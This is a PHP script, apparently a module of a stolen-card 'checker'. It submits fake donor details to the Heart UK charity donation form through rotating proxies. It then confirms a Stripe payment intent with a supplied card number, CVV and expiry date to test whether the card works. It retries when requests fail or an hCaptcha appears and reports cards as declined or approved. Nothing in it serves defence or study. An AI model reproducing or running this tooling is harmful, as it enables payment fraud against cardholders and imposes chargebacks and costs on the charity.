<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$data = 'amount=other&otheramount=5&title=Mr&title_other_value=&firstname='.$fake->first.'&lastname='.$fake->last.'&country=United+States&postcode=10509&address1=12+main+street&address2=&town=Brewster&county=&telephone=&email='.urlencode($fake->email).'&donation_submit=Next+step';

$r1 = $this->curlx->Post('https://www.heartuk.org.uk/donate/single-donation/submit', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$client_secret = trim($this->getstr($this->getstr($r1->body, 'stripe.handleCardPayment(', ','), '"', '"'));

$pi_id = explode('_secret_', $client_secret)[0];

if (empty($pi_id)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$data = 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$fake->first.'+'.$fake->last.'&payment_method_data[billing_details][email]='.urlencode($fake->email).'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[card][exp_year]='.$yy.'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[payment_user_agent]=stripe.js%2Ff06870666%3B+stripe-js-v3%2Ff06870666&payment_method_data[time_on_page]='.rand(50000, 100000).'&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_b0Wwz4q7JcwFqfqBjmSkndzv&client_secret='.$client_secret;

$r2 = $this->curlx->Post('https://api.stripe.com/v1/payment_intents/'.$pi_id.'/confirm', $data, null, null, $server['proxy']);

if (!$r2->success) goto start;

if (strpos($r2->body, 'verify_challenge') !== false) {
	$empty = 'Second Request Contains HCaptcha!';

	goto start;
}

$json_r2 = json_decode($r2->body);

if (isset($json_r2->error)) {
	$status = $this->response->ErrorHandler($json_r2->error);

	goto end;
}

$status = $this->response->Stripe($r2->body);

end: